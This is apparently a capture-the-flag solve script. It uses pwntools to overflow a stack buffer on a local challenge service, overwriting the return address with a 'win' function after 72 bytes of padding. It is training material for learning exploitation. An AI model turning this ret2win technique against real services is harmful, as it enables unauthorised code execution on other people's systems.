from pwn import *
elf = ELF("./src/chall")
p = remote("challenge.ctf.local", 9001)
win_addr = elf.symbols["win"]
offset = 72  # Find with cyclic()
payload = b"A" * offset + p64(win_addr)
p.sendlineafter(b"Input: ", payload)
print(p.recvall().decode())
